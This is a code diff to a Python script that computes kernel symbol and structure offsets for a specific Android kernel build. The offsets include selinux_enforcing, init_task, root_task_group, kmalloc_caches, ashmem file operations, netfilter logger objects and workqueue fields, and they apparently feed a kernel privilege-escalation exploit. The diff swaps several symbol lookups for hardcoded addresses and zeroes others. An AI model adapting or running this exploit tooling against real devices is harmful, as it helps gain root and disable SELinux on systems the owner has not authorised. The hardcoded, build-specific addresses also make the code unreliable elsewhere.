@@ -1137,11 +1137,16 @@ def main():
         raise SystemExit("boot_id string not found in kernel")
     rt = off('random_table')
     bootid_data = None
-    for e in range(rt, rt + 0x800, 0x40):
+    for e in range(rt, rt + 0x800, 8):
         p, d = struct.unpack_from('<QQ', kernel, e)
         if p == base + bootid_str:
             bootid_data = (e + 8, d)
             break
+    #for e in range(rt, rt + 0x800, 0x40):
+    #    p, d = struct.unpack_from('<QQ', kernel, e)
+    #    if p == base + bootid_str:
+    #        bootid_data = (e + 8, d)
+    #        break
     if bootid_data is None:
         raise SystemExit("boot_id entry not found in random_table")
     if bootid_data[1] != sym['sysctl_bootid']:
@@ -1316,23 +1321,21 @@ def main():
         'SPLICE': f'0x{off(splice):08x}',
         'CFG_READ': f'0x{off("configfs_read_iter"):08x}',
         'CFG_WRITE': f'0x{off("configfs_bin_write_iter"):08x}',
-        'ASHMEM_IOCTL': f'0x{off("ashmem_ioctl"):08x}',
-        'ASHMEM_COMPAT': f'0x{off("compat_ashmem_ioctl"):08x}',
-        'ASHMEM_MMAP': f'0x{off("ashmem_mmap"):08x}',
-        'ASHMEM_OPEN': f'0x{off("ashmem_open"):08x}',
-        'ASHMEM_REL': f'0x{off("ashmem_release"):08x}',
-        'ASHMEM_FDINFO': f'0x{off("ashmem_show_fdinfo"):08x}',
+        'ASHMEM_IOCTL': '0x00f91f28',
+        'ASHMEM_COMPAT': '0x00f94000',
+        'ASHMEM_MMAP': '0x00f91a2c',
+        'ASHMEM_OPEN': '0x00f93f24',
+        'ASHMEM_REL': '0x00f93748',
+        'ASHMEM_FDINFO': '0x00f91898',       
         'ANON_PIPE': f'0x{off("anon_pipe_buf_ops"):08x}',
-        'ASHMEM_FOPS': f'0x{off("ashmem_fops"):08x}',
+        'ASHMEM_FOPS': '0x00000000',
         'KMALLOC': f'0x{off("kmalloc_caches"):08x}',
         'UNBOUND_WQ': f'0x{off("system_unbound_wq"):08x}',
         'INIT_TASK': f'0x{off("init_task"):08x}',
         'ROOT_TG': f'0x{off("root_task_group"):08x}',
         'SELINUX': f'0x{selinux_enforcing:08x}',
         'SYSCTL_BOOTID': f'0x{off("sysctl_bootid"):08x}',
-        'ASHMEM_MISC': ('0x%08x' %
-                        off('ashmem_misc' if has_symbol(sym, 'ashmem_misc')
-                            else 'ashmem_miscs')),
+        'ASHMEM_MISC': '0x00000000',
         'NFULNL_NAME': f'0x{nfulnl_name:08x}',
         'NFULNL_OBJ': f'0x{logger_obj:08x}',
         'BOOTID_DATA': f'0x{bootid_data[0]:08x}',
@@ -1374,7 +1377,7 @@ def main():
         'PWQ_REFCNT': f'0x{f("pool_workqueue", "refcnt"):02x}',
         'PWQ_INFLIGHT': f'0x{f("pool_workqueue", "nr_in_flight"):02x}',
         'PWQ_ACTIVE': f'0x{f("pool_workqueue", "nr_active"):02x}',
-        'PWQ_MAXACT': f'0x{f("pool_workqueue", "max_active"):02x}',
+        'PWQ_MAXACT': f'0x{f("workqueue_struct", "max_active"):02x}',
         'POOL_WORKLIST': f'0x{f("worker_pool", "worklist"):02x}',
         'POOL_NRIDLE': f'0x{f("worker_pool", "nr_idle"):02x}',
         'WQ_DFL_PWQ': f'0x{f("workqueue_struct", "dfl_pwq"):02x}',
